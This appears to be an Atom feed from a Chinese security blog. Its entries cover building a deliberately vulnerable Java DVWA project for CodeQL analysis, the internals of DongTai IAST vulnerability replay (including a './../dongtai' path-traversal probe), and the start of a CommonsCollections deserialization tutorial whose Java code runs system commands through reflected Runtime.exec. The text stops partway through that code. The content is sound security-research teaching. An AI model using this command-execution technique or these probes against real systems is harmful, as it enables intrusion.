<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ch35TnuT&#39;s Blog</title>
  
  
  <link href="http://che35tnut.github.io/atom.xml" rel="self"/>
  
  <link href="http://che35tnut.github.io/"/>
  <updated>2023-03-17T08:57:58.256Z</updated>
  <id>http://che35tnut.github.io/</id>
  
  <author>
    <name>Ch35TnuT</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>用javac编译项目并用CodeQL生成CodeDB</title>
    <link href="http://che35tnut.github.io/2023/03/17/20230317-Codeql-javac%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE/"/>
    <id>http://che35tnut.github.io/2023/03/17/20230317-Codeql-javac%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE/</id>
    <published>2023-03-17T08:03:00.000Z</published>
    <updated>2023-03-17T08:57:58.256Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2020年，用Java开发了一个DVWA靶场项目，技术栈是Servlet+JDBC，打包成War文件，在tomcat容器中运行。但是CodeQL的默认编译脚本无法处理这个项目，需要自定义编译命令。</p><p><a href="https://github.com/Ch35Tnut/Java_DVWA">项目地址</a></p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>该项目目录如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">|____web</span><br><span class="line">| |____CSRFImpossible.jsp</span><br><span class="line">| |____brute.jsp</span><br><span class="line">| |____file</span><br><span class="line">| | |____file1.jsp</span><br><span class="line">| |____command.jsp</span><br><span class="line">| |____fileUpload.jsp</span><br><span class="line">| |____fileInclude.jsp</span><br><span class="line">| |____SQLInjection.jsp</span><br><span class="line">| |____XSSStored.jsp</span><br><span class="line">| |____login.jsp</span><br><span class="line">| |____index.jsp</span><br><span class="line">| |____WEB-INF</span><br><span class="line">| | |____lib</span><br><span class="line">| | | |____mysql-connector-java-8.0.20.jar</span><br><span class="line">| | | |____standard.jar</span><br><span class="line">| | | |____mchange-commons-java-0.2.19.jar</span><br><span class="line">| | | |____c3p0-oracle-thin-extras-0.9.5.5.jar</span><br><span class="line">| | | |____commons-fileupload-1.4.jar</span><br><span class="line">| | | |____java-jwt-3.2.0.jar</span><br><span class="line">| | | |____jackson-core-2.11.2.jar</span><br><span class="line">| | | |____commons-io-2.7.jar</span><br><span class="line">| | | |____commons-codec-1.14.jar</span><br><span class="line">| | | |____jackson-annotations-2.11.2.jar</span><br><span class="line">| | | |____jackson-databind-2.11.2.jar</span><br><span class="line">| | | |____c3p0-0.9.5.5.jar</span><br><span class="line">| | | |____jstl.jar</span><br><span class="line">| | | |____commons-lang3-3.11.jar</span><br><span class="line">| | | |____commons-dbutils-1.7.jar</span><br><span class="line">| | |____web.xml</span><br><span class="line">| |____CSRF.jsp</span><br><span class="line">| |____XSSReflected.jsp</span><br><span class="line">|____lib</span><br><span class="line">| |____javax.persistence.jar</span><br><span class="line">| |____javax.jms.jar</span><br><span class="line">| |____javax.servlet.jsp.jar</span><br><span class="line">| |____javax.annotation.jar</span><br><span class="line">| |____javax.transaction.jar</span><br><span class="line">| |____javax.ejb.jar</span><br><span class="line">| |____javax.resource.jar</span><br><span class="line">| |____javax.servlet.jar</span><br><span class="line">| |____inspectionProfiles</span><br><span class="line">|____src</span><br><span class="line">| |____c3p0-config.xml</span><br><span class="line">| |____com</span><br><span class="line">| | |____chestnut</span><br><span class="line">| | | |____repository</span><br><span class="line">| | | | |____UserRespository.java</span><br><span class="line">| | | | |____SQLInjectionRespository.java</span><br><span class="line">| | | | |____CSRFRespository.java</span><br><span class="line">| | | | |____BruteRespository.java</span><br><span class="line">| | | | |____GuestbookRespository.java</span><br><span class="line">| | | |____entity</span><br><span class="line">| | | | |____Guestbook.java</span><br><span class="line">| | | | |____User.java</span><br><span class="line">| | | |____utils</span><br><span class="line">| | | | |____MD5Tools.java</span><br><span class="line">| | | | |____JDBCTools.java</span><br><span class="line">| | | | |____TokenTools.java</span><br><span class="line">| | | | |____JWTTools.java</span><br><span class="line">| | | |____controller</span><br><span class="line">| | | | |____XSSReflectedServlet.java</span><br><span class="line">| | | | |____BruteServlet.java</span><br><span class="line">| | | | |____SQLInjectionServlet.java</span><br><span class="line">| | | | |____CommnandServlet.java</span><br><span class="line">| | | | |____CSRFServlet.java</span><br><span class="line">| | | | |____LoginServlet.java</span><br><span class="line">| | | | |____FileUploadServlet.java</span><br><span class="line">| | | | |____FileIncludeServlet.java</span><br><span class="line">| | | | |____CSRFImpossibleServlet.java</span><br><span class="line">| | | | |____XSSStroedServlet.java</span><br><span class="line">| | | |____service</span><br><span class="line">| | | | |____CSRFService.java</span><br><span class="line">| | | | |____BruteService.java</span><br><span class="line">| | | | |____SQLInjectionService.java</span><br><span class="line">| | | | |____CommandService.java</span><br><span class="line">| | | | |____XSSService.java</span><br><span class="line">| | | | |____LoginService.java</span><br></pre></td></tr></table></figure><p>网上搜了一下，没有找到idea 是如何编译这个项目的，于是打算用原生的<code>javac</code>来编译这个命令。</p><p>其中如下参数需要说明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用法: javac &lt;options&gt; &lt;source files&gt;</span><br><span class="line">-d  指定放置生成的类文件的位置</span><br><span class="line">-encoding 指定源文件使用的字符编码</span><br><span class="line">--extdirs  覆盖所安装扩展的位置(引用的jar包文件)</span><br><span class="line">@&lt;文件名&gt; 从文件读取选项和文件名(多个Java文件写在此文件中)</span><br><span class="line">&lt;source files&gt; 要编译的java文件，可以用@&lt;文件名&gt;指定多个要编译的java文件</span><br></pre></td></tr></table></figure><p>##步骤：</p><ol><li>应该将所有需要编译的文件写入一个文件内。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;*.java&quot; &gt; ./source.list</span><br></pre></td></tr></table></figure></li><li>编译该项目<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d target -encoding utf-8  -extdirs ./web/WEB-INF/lib;./lib @source.list</span><br></pre></td></tr></table></figure></li></ol><h1 id="生成CodeDB"><a href="#生成CodeDB" class="headerlink" title="生成CodeDB"></a>生成CodeDB</h1><p>只需要在生成CodeDB时，指定编译命令即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create CodeQL_DVWA --language=java --command=&quot;javac -d target -encoding utf-8 -cp ./lib -extdirs ./web/WEB-INF/lib:./lib @source.list&quot;</span><br></pre></td></tr></table></figure><p>Ref:<br><a href="https://www.jianshu.com/p/7f0c03339dc7">javac命令的使用和运作原理</a><br><a href="https://zhuanlan.zhihu.com/p/29345229">利用原始的javac编译整个Java项目</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;2020年，用Java开发了一个DVWA靶场项目，技术栈是Servlet+JDBC，打包成War文件，在tomcat容器中运行。但是Code</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>洞态IAST 漏洞验证</title>
    <link href="http://che35tnut.github.io/2022/04/13/220413-DongTaiVulCheck/"/>
    <id>http://che35tnut.github.io/2022/04/13/220413-DongTaiVulCheck/</id>
    <published>2022-04-13T06:38:13.000Z</published>
    <updated>2022-10-12T11:31:08.901Z</updated>
    
    <content type="html"><![CDATA[<h1 id="主动验证"><a href="#主动验证" class="headerlink" title="主动验证"></a>主动验证</h1><p>当 DongTai Engine 检测出 Java 应用某接口有安全漏洞后，会向 Dongtai-Java-Agent 发送重放请求，这个重放请求会携带特定的 payload ，去验证该漏洞是否真实存在。<br>截止1.4.0版本，该payload为<code>./../dongtai</code>，以硬编码的形式存储在<code>DongTai-engine/core/tasks.py#vul_recheck()</code>中。</p><h2 id="触发方式"><a href="#触发方式" class="headerlink" title="触发方式"></a>触发方式</h2><ol><li>自动触发<br>开启“主动验证”功能。</li><li>手动触发<br>漏洞详情页面点击验证漏洞。</li></ol><h2 id="验证逻辑"><a href="#验证逻辑" class="headerlink" title="验证逻辑"></a>验证逻辑</h2><ol><li>DongTaiEngine定时任务，<code>DongTai-engine/core/tasks.py#vul_recheck()</code>。该任务会从数据库<code>iast_replay_queue</code>取出待验证的漏洞，重放流量。该条流量携带payload。</li><li>Agent端通过心跳的响应包，获取重放请求后，重新发起HTTP请求。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// io.dongtai.iast.core.service.AgentQueueReport#run</span></span><br><span class="line"><span class="comment">// 发送心跳</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">replayRequestRaw</span> <span class="operator">=</span> HttpClientUtils.sendPost(Constants.API_REPORT_UPLOAD, generateHeartBeatMsg());</span><br><span class="line"><span class="comment">// 执行重放任务</span></span><br><span class="line">ThreadPools.submitReplayTask(replayRequestRaw);</span><br><span class="line"></span><br><span class="line"><span class="comment">// io.dongtai.iast.core.replay.HttpRequestReplay#doReplay</span></span><br><span class="line">HashMap&lt;String, String&gt; headers = splitHeaderStringToHashmap(replayModel.getRequestHeader());</span><br><span class="line"><span class="comment">// Header头中加上特殊字段，重新发送http请求</span></span><br><span class="line">headers.put(<span class="string">&quot;dongtai-replay-id&quot;</span>, String.valueOf(replayModel.getReplayId()));</span><br><span class="line">headers.put(<span class="string">&quot;dongtai-relation-id&quot;</span>, String.valueOf(replayModel.getRelationId()));</span><br><span class="line">headers.put(<span class="string">&quot;dongtai-replay-type&quot;</span>, String.valueOf(replayModel.getReplayType()));</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> replayModel.getFullUrl();</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">      sendRequest(replayModel.getRequestMethod(), url, replayModel.getRequestBody(), headers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>携带payload的重放流量和普通流量的处理逻辑一致，并无拦截操作。（拦截操作是强需求，否则会给业务带来脏数据）</li></ol><h1 id="心跳上报"><a href="#心跳上报" class="headerlink" title="心跳上报"></a>心跳上报</h1><p>两种上报功能，对应服务端同一个API。</p><h2 id="Agent包中上报功能"><a href="#Agent包中上报功能" class="headerlink" title="Agent包中上报功能"></a>Agent包中上报功能</h2><p><code>io.dongtai.iast.agent.report.HeartBeatReport</code><br>仅上报性能指标和Agent运行状态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HttpClientUtils.sendPost(Constant.API_REPORT_UPLOAD, HeartBeatReport.generateHeartBeatMsg());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateHeartBeatMsg</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">JSONObject</span> <span class="variable">report</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">   <span class="type">JSONObject</span> <span class="variable">detail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">   report.put(Constant.KEY_UPDATE_REPORT, Constant.REPORT_HEART_BEAT);</span><br><span class="line">   report.put(Constant.KEY_REPORT_VALUE, detail);</span><br><span class="line"></span><br><span class="line">   detail.put(Constant.KEY_AGENT_ID, AgentRegisterReport.getAgentFlag());</span><br><span class="line">   detail.put(Constant.KEY_MEMORY, getMemInfo());</span><br><span class="line">   detail.put(Constant.KEY_CPU, readCpuInfo());</span><br><span class="line">   detail.put(Constant.KEY_DISK,getDiskInfo());</span><br><span class="line">   detail.put(Constant.KEY_PERFORMANCE, readRecentlyPerformanceMetrics());</span><br><span class="line">   detail.put(Constant.KEY_CORE_INSTALLED, EngineManager.checkCoreIsInstalled() ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">   detail.put(Constant.KEY_CORE_RUNNING, EngineManager.checkCoreIsRunning() ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">   detail.put(Constant.KEY_RETURN_QUEUE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> report.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Core包中上报功能"><a href="#Core包中上报功能" class="headerlink" title="Core包中上报功能"></a>Core包中上报功能</h2><p><code>io.dongtai.iast.core.service.AgentQueueReport</code><br>上报Agent队列与请求数量，返回待重放的消息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">StringBuilder</span> <span class="variable">replayRequestRaw</span> <span class="operator">=</span> HttpClientUtils.sendPost(Constants.API_REPORT_UPLOAD, generateHeartBeatMsg());</span><br><span class="line">      <span class="comment">// 重放流量</span></span><br><span class="line">      ThreadPools.submitReplayTask(replayRequestRaw);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      DongTaiLog.error(<span class="string">&quot;send agent status failure, reason: &#123;&#125;&quot;</span>, e);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      DongTaiLog.error(<span class="string">&quot;send API Queue to &#123;&#125; error, reason: &#123;&#125;&quot;</span>, Constants.API_REPORT_UPLOAD, e);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateHeartBeatMsg</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">JSONObject</span> <span class="variable">report</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">   <span class="type">JSONObject</span> <span class="variable">detail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">   report.put(ReportConstant.REPORT_KEY, ReportConstant.REPORT_HEART_BEAT);</span><br><span class="line">   report.put(ReportConstant.REPORT_VALUE_KEY, detail);</span><br><span class="line">   detail.put(ReportConstant.AGENT_ID, EngineManager.getAgentId());</span><br><span class="line">   detail.put(ReportConstant.REQ_COUNT, EngineManager.getRequestCount());</span><br><span class="line">   detail.put(ReportConstant.REPORT_QUEUE, <span class="number">0</span>);</span><br><span class="line">   detail.put(ReportConstant.METHOD_QUEUE, <span class="number">0</span>);</span><br><span class="line">   detail.put(ReportConstant.REPLAY_QUEUE, <span class="number">0</span>);</span><br><span class="line">   detail.put(ReportConstant.KEY_RETURN_QUEUE, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> report.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务端处理心跳数据"><a href="#服务端处理心跳数据" class="headerlink" title="服务端处理心跳数据"></a>服务端处理心跳数据</h2><p><code>OpenAPI.apiserver.report.handler.heartbeat_handler.HeartBeatHandler</code><br>更新Agent状态<code>HeartBeatHandler#save_heartbeat</code>，返回待重放的流量<code>HeartBeatHandler#get_result</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_result</span>(<span class="params">self, msg=<span class="literal">None</span></span>):</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      <span class="comment"># ......</span></span><br><span class="line">      <span class="keyword">for</span> replay_request <span class="keyword">in</span> replay_queryset:</span><br><span class="line">            <span class="keyword">if</span> replay_request[<span class="string">&#x27;uri&#x27;</span>]:</span><br><span class="line">               replay_requests.append(replay_request)</span><br><span class="line">               success_ids.append(replay_request[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">               <span class="keyword">if</span> replay_request[<span class="string">&#x27;replay_type&#x27;</span>] == const.VUL_REPLAY:</span><br><span class="line">                  success_vul_ids.append(replay_request[<span class="string">&#x27;relation_id&#x27;</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               failure_ids.append(replay_request[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">               <span class="keyword">if</span> replay_request[<span class="string">&#x27;replay_type&#x27;</span>] == const.VUL_REPLAY:</span><br><span class="line">                  failure_vul_ids.append(replay_request[<span class="string">&#x27;relation_id&#x27;</span>])</span><br><span class="line"></span><br><span class="line">      timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line">      <span class="comment"># 标记重放流量处理状态</span></span><br><span class="line">      IastReplayQueue.objects.<span class="built_in">filter</span>(id__in=success_ids).update(update_time=timestamp, state=const.SOLVING)</span><br><span class="line">      IastReplayQueue.objects.<span class="built_in">filter</span>(id__in=failure_ids).update(update_time=timestamp, state=const.SOLVED)</span><br><span class="line"></span><br><span class="line">      IastVulnerabilityModel.objects.<span class="built_in">filter</span>(id__in=success_vul_ids).update(latest_time=timestamp, status_id=<span class="number">2</span>)</span><br><span class="line">      IastVulnerabilityModel.objects.<span class="built_in">filter</span>(id__in=failure_vul_ids).update(latest_time=timestamp, status_id=<span class="number">1</span>)</span><br><span class="line">      logger.info(_(<span class="string">&#x27;Reproduction request issued successfully&#x27;</span>))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> replay_requests</span><br><span class="line">      <span class="comment"># ......</span></span><br></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>Agent端两套上报功能，一个未接收待重放的流量，另一个接受并处理待重放的流量。服务端同一套处理逻辑，理论上是会丢掉一部分待重放的流量。</li><li>心跳上报和流量重放有必要耦合在一起吗？如果耦合在一起，两种心跳上报应该要区分。</li></ol><h1 id="IAST降级策略"><a href="#IAST降级策略" class="headerlink" title="IAST降级策略"></a>IAST降级策略</h1><ol><li>30s检测一次，连续2次检测到CPU使用率超过70%，性能断路器打开。等待40s后断路器进入半开状态，半开后重新累计统计，连续2次检测超标，性能断路器打开，否则性能断路器关闭。性能断路器持续打开时间超过120秒或200秒内断路器打开2次，启动降级策略（卸载core包）。</li><li>30s检测一次，连续2次检测到DongTai线程数超过1000个，性能断路器打开。等待40s后断路器进入半开状态，半开后重新累计统计，连续2次检测超标，性能断路器打开，否则性能断路器关闭。性能断路器持续打开时间超过120秒或200秒内断路器打开2次，启动降级策略（卸载core包）。</li><li>30s检测一次，连续2次检测到老年代垃圾回收器2秒内超过10次，性能断路器打开。等待40s后断路器进入半开状态，半开后重新累计统计，连续2次检测超标，性能断路器打开，否则性能断路器关闭。性能断路器持续打开时间超过120秒或200秒内断路器打开2次，启动降级策略（卸载core包）。</li><li>30s检测一次，连续2次检测到JVM 内存使用率超过80%，性能断路器打开。等待40s后断路器进入半开状态，半开后重新累计统计，连续2次检测超标，性能断路器打开，否则性能断路器关闭。性能断路器持续打开时间超过120秒或200秒内断路器打开2次，启动降级策略（卸载core包）。</li><li>30s检测一次，连续2次检测到JVM 堆外内存超过1000000000byte，性能断路器打开。等待40s后性能断路器进入半开状态，半开后重新累计统计，连续2次检测超标，性能断路器打开，否则性能断路器关闭。性能断路器持续打开时间超过120秒或200秒内断路器打开2次，启动降级策略（卸载core包）。</li><li>30s检测一次多指标【CPU使用率超过50%，老年代垃圾回收器1秒内超过5次，JVM内存使用率超过70，VM 堆外内存超过5000000000byte】，以上指标任意3个连续2次超标，性能断路器打开。等待40秒后性能断路器进入半开状态，半开后重新累计统计，连续2次检测超标，性能断路器打开，否则性能断路器关闭。性能断路器持续打开时间超过120秒或200秒内断路器打开2次，启动降级策略（卸载core包）。</li><li>流量请求超过20QPS，流量断路器打开，等待30秒后流量断路器进入关闭状态。流量断路器打开时间超过120秒或200秒内断路器打开2次，启动降级策略（卸载core包）。</li><li>单个请求1秒hook点数量超过5000，在当前请求生命周期内，在污点池中后续数据的收集短路。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;主动验证&quot;&gt;&lt;a href=&quot;#主动验证&quot; class=&quot;headerlink&quot; title=&quot;主动验证&quot;&gt;&lt;/a&gt;主动验证&lt;/h1&gt;&lt;p&gt;当 DongTai Engine 检测出 Java 应用某接口有安全漏洞后，会向 Dongtai-Java-Agent 发送</summary>
      
    
    
    
    
    <category term="IAST" scheme="http://che35tnut.github.io/tags/IAST/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollection反序列化</title>
    <link href="http://che35tnut.github.io/2021/11/29/211129-Java-CommonsCollections-Deserialization/"/>
    <id>http://che35tnut.github.io/2021/11/29/211129-Java-CommonsCollections-Deserialization/</id>
    <published>2021-11-29T06:52:34.000Z</published>
    <updated>2022-10-12T11:31:08.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通过反序列化执行系统命令"><a href="#通过反序列化执行系统命令" class="headerlink" title="通过反序列化执行系统命令"></a>通过反序列化执行系统命令</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//      1.普通命令执行。</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//      2.反射命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">                    Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">String</span> [] &#123; <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//      3.反射命令执行的调用链拆解，方便理解。</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 系统命令</span></span><br><span class="line">            String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;;</span><br><span class="line">            <span class="comment">// 反射生成java.lang.Runtime.exec()方法 ----exec()</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">methodExec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">            <span class="comment">// 反射生成java.lang.Runtime.getRuntime()方法。实际上运行时，该方法返回的是RunTime的实例化对象。 --- getRuntime()</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">methodGetRuntime</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">            <span class="comment">// 反射生成java.lang.Runtime类 ----- Runtime</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazzRunTime</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            <span class="comment">// 执行命令</span></span><br><span class="line">            methodExec.invoke(methodGetRuntime.invoke(clazzRunTime),cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 